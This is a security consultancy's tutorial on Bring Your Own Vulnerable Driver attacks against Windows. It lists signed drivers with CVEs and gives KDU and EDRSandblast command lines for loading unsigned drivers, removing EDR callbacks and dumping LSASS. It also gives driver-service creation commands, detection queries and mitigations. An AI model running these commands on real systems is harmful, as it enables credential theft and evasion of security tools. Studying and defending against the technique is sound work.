---
# 🛠️ Vulnerable Drivers

**By Ayi NEDJIMI** | [Ayinedjimi Consultants](https://www.ayinedjimi-consultants.fr)

---

## Theory

### Overview

Vulnerable Windows drivers represent a critical attack vector for privilege escalation and security product bypass. The **Bring Your Own Vulnerable Driver (BYOVD)** technique allows attackers with administrative privileges to load legitimate, signed drivers that contain exploitable vulnerabilities, gaining ring 0 (kernel-level) access to perform actions normally restricted by Windows security mechanisms.

Unlike traditional privilege escalation techniques, BYOVD attacks exploit the trust model of Windows Driver Signature Enforcement (DSE). Since Windows requires kernel drivers to be digitally signed by trusted authorities, attackers leverage properly signed but vulnerable drivers to bypass this protection without needing to compromise the signing infrastructure itself.

### Attack Prerequisites

* **Administrative privileges**: Required to load drivers (Microsoft does not consider admin-to-kernel a security boundary)
* **Vulnerable driver binary**: A signed driver with known exploitable vulnerabilities
* **Driver loading capability**: Ability to install and start a kernel service

### Common Vulnerability Types

#### IOCTL Request Exploitation

Input/Output Control (IOCTL) requests provide the primary attack surface. Vulnerable drivers fail to properly validate user-supplied inputs, allowing attackers to:

* Perform arbitrary memory read/write operations
* Access Model-Specific Registers (MSRs)
* Manipulate hardware I/O ports
* Bypass kernel memory protections

#### Typical Vulnerability Patterns

* **Arbitrary read/write primitives**: Insufficient input validation in IOCTL handlers
* **Missing access controls**: No verification of caller privileges before executing sensitive operations
* **Memory mapping vulnerabilities**: Direct mapping of physical memory to user space
* **MSR manipulation**: Unrestricted access to CPU-specific registers

## Practice

### Finding Vulnerable Drivers

#### LOLDrivers Database

The [LOLDrivers](https://loldrivers.io) project maintains a comprehensive, community-driven database of vulnerable and malicious Windows drivers. This resource provides:

* Hash values (SHA1, SHA256) of known vulnerable drivers
* CVE references and vulnerability details
* YARA and Sigma detection rules
* Integration with security tools (Splunk, Microsoft Defender, etc.)

Check vulnerable drivers in your environment:

```bash
# Using PowerShell
$web_client = New-Object System.Net.WebClient
$loldrivers = $web_client.DownloadString("https://www.loldrivers.io/api/drivers.json") | ConvertFrom-Json
$drivers = Get-ChildItem C:\Windows\System32\drivers -Filter *.sys

foreach ($lol in $loldrivers.KnownVulnerableSamples) {
    if ($drivers.Name -contains $lol.Filename) {
        $Hash = Get-FileHash -Path "C:\Windows\System32\drivers\$($lol.Filename)"
        if ($lol.SHA256 -eq $Hash.Hash) {
            Write-Host "Vulnerable driver found: $($lol.Filename)" -ForegroundColor Red
        }
    }
}
```

### Exploitation Tools

#### KDU (Kernel Driver Utility)

[KDU](https://github.com/hfiref0x/KDU) is the de facto standard tool for exploiting vulnerable drivers. It supports 14+ different vulnerable drivers and provides:

* Arbitrary kernel memory read/write
* DSE (Driver Signature Enforcement) bypass
* Loading of unsigned drivers
* Process protection manipulation

**Supported drivers** (partial list):
* `RTCore64.sys` (CVE-2019-16098) - MSI Afterburner
* `DBUtil_2_3.sys` (CVE-2021-21551) - Dell BIOS Utility
* `gdrv.sys` (CVE-2018-19320) - Gigabyte driver
* `iqvw64e.sys` (CVE-2015-2291) - Intel Ethernet diagnostics
* `PROCEXP152.sys` - Process Explorer (signed by Microsoft)

```bash
# Basic usage - load unsigned driver
KDU.exe -dse 6 -map C:\path\to\unsigned_driver.sys

# Bypass DSE and load malicious driver
KDU.exe -prv 1 -map evil.sys
```

#### EDRSandblast

[EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) weaponizes vulnerable drivers specifically to bypass EDR/AV solutions by:

* Removing kernel callbacks (Process, Thread, Image Load notifications)
* Disabling Object Callbacks (Process/Thread handle operations)
* Neutralizing ETW TI (Event Tracing for Windows - Threat Intelligence) provider
* Removing LSA Protection from LSASS
* Unhooking userland APIs

**Key capabilities:**

```bash
# Audit EDR kernel callbacks
EDRSandblast.exe --kernelmode audit

# Dump LSASS while evading EDR
EDRSandblast.exe --usermode --kernelmode dump -o lsass.dmp

# Remove all EDR callbacks and get cmd.exe
EDRSandblast.exe --kernelmode cmd

# Disable Credential Guard
EDRSandblast.exe --kernelmode credguard

# Load unsigned driver
EDRSandblast.exe --kernelmode load_unsigned_driver --unsigned-driver evil.sys
```

**Supported vulnerable drivers:**
* `gdrv.sys` (Gigabyte) - default
* `RTCore64.sys` (MSI Afterburner) 
* `DBUtil_2_3.sys` (Dell)

#### Other Notable Tools

**EDRSandblast-GodFault**: Modified version that achieves the same results without vulnerable drivers by exploiting admin-to-kernel vulnerabilities

**DriverJack**: Loads vulnerable drivers using NTFS techniques to bypass service registration

**Backstab**: Terminates protected processes using Process Explorer driver

**Terminator**: Kills EDR processes using `zam64.sys` driver

### Common Vulnerable Drivers

| Driver | Vendor | CVE | Capabilities |
|--------|--------|-----|--------------|
| `RTCore64.sys` | MSI Afterburner | CVE-2019-16098 | Arbitrary memory R/W, MSR access |
| `DBUtil_2_3.sys` | Dell | CVE-2021-21551 | Arbitrary memory R/W |
| `gdrv.sys` | Gigabyte | CVE-2018-19320 | Physical memory R/W |
| `iqvw64e.sys` | Intel | CVE-2015-2291 | Arbitrary kernel code execution |
| `PROCEXP152.sys` | Sysinternals | N/A | Process termination (by design) |
| `stdcdrv64.sys` | Intel | Undocumented | Firmware manipulation, SPI access |
| `nvoclock.sys` | NVIDIA | Undocumented | Arbitrary memory R/W |

### Typical Attack Flow

1. **Gain administrative access** on target system (phishing, exploitation, stolen credentials)

2. **Deploy vulnerable driver**:
```bash
# Create service
sc create VulnDriver binPath="C:\path\to\vulnerable.sys" type=kernel
# Start service
sc start VulnDriver
```

3. **Exploit driver** for arbitrary kernel read/write primitive

4. **Disable security mechanisms**:
   * Remove EDR kernel callbacks
   * Disable PPL (Protected Process Light) on security processes
   * Unhook userland APIs
   * Neutralize ETW providers

5. **Execute malicious objectives**:
   * Dump credentials (LSASS)
   * Load unsigned rootkit
   * Establish persistence
   * Lateral movement

6. **Clean up**: Optionally unload driver to reduce forensic footprint

### Defense Evasion Techniques

**Certificate abuse**: Using stolen or legitimate certificates from trusted vendors (NVIDIA, Global Software LLC) to sign drivers

**Driver blocklist bypass**: Using drivers not yet added to Microsoft's vulnerable driver blocklist

**Service hijacking**: Hijacking existing services instead of creating new ones

**Memory-only operation**: Executing from memory without writing to disk

### Detection Opportunities

**Driver load monitoring**: Monitor `Sysmon Event ID 6` (driver load) or `DeviceEvents` table in MDE where `ActionType == "DriverLoad"`

```kql
// Detect LOLDrivers in Microsoft Defender
let LOLDrivers = externaldata (Category:string, KnownVulnerableSamples:dynamic, Verified:string)
[@"https://www.loldrivers.io/api/drivers.json"]
with (format=multijson);
DeviceEvents
| where ActionType == "DriverLoad"
| join kind=inner (LOLDrivers | mv-expand KnownVulnerableSamples) on $left.SHA256 == $right.KnownVulnerableSamples.SHA256
```

**Unusual driver locations**: Legitimate drivers should be in `C:\Windows\System32\drivers`

**Kernel callback monitoring**: Periodically verify EDR callbacks are still registered

**HVCI enablement**: Hypervisor-protected Code Integrity blocks known vulnerable drivers

## Mitigation Strategies

### Microsoft Recommended Driver Block List

Enable the driver blocklist (default on Windows 11):

```powershell
# Enable vulnerable driver blocklist
reg add "HKLM\SYSTEM\CurrentControlSet\Control\CI\Config" /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 1 /f
```

### HVCI (Hypervisor-protected Code Integrity)

Enable HVCI to prevent kernel memory modifications:

```powershell
# Check HVCI status
Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesRunning

# Enable Memory Integrity (HVCI)
# Settings > Update & Security > Windows Security > Device Security > Core isolation details > Memory integrity
```

### WDAC (Windows Defender Application Control)

Implement driver allowlisting policies to restrict which drivers can load.

### Attack Surface Reduction

* Remove unnecessary drivers from systems
* Regularly audit installed drivers against LOLDrivers database
* Implement least privilege (minimize local admin accounts)
* Monitor driver loading events in EDR/SIEM

### Organizational Controls

* Maintain driver inventory across fleet
* Patch/update vulnerable drivers from vendors
* Network segmentation to limit lateral movement
* Incident response plans for kernel compromise scenarios

## Resources

### Tools & Databases

* [LOLDrivers](https://loldrivers.io) - Comprehensive vulnerable driver database
* [KDU](https://github.com/hfiref0x/KDU) - Kernel Driver Utility exploitation framework
* [EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast) - EDR bypass via vulnerable drivers
* [EDRSandblast-GodFault](https://github.com/gabriellandau/EDRSandblast-GodFault) - Driverless version
* [Microsoft Vulnerable Driver Blocklist](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules)

### Detection Rules

* [Sigma rules for LOLDrivers](https://github.com/SigmaHQ/sigma/tree/master/rules/windows/driver_load)
* [Splunk Security Content - Windows Drivers](https://research.splunk.com/stories/windows_drivers/)
* [YARA rules from LOLDrivers project](https://github.com/magicsword-io/LOLDrivers/tree/main/detections/yara)

### Research & Reading

* [Rapid7: Driver-Based Attacks Past and Present](https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/)
* [VMware: Bring Your Own Backdoor](https://blogs.vmware.com/security/2023/04/bring-your-own-backdoor-how-vulnerable-drivers-let-hackers-in.html)
* [Elastic: Forget Vulnerable Drivers - Admin is All You Need](https://www.elastic.co/security-labs/forget-vulnerable-drivers-admin-is-all-you-need)
* [SecurityJoes: Weaponizing Windows Drivers](https://www.securityjoes.com/post/weaponizing-windows-drivers-a-hacker-s-guide-for-beginners)

### Professional Services

For expert assistance with offensive security, red team operations, or defensive strategies against driver-based attacks, visit [Ayinedjimi Consultants](https://www.ayinedjimi-consultants.fr)

For more advanced hacking techniques and tutorials, check out [Hacking Techniques by Ayi NEDJIMI](https://ayinedjimi-consultants.fr/articles/techniques-hacking/)
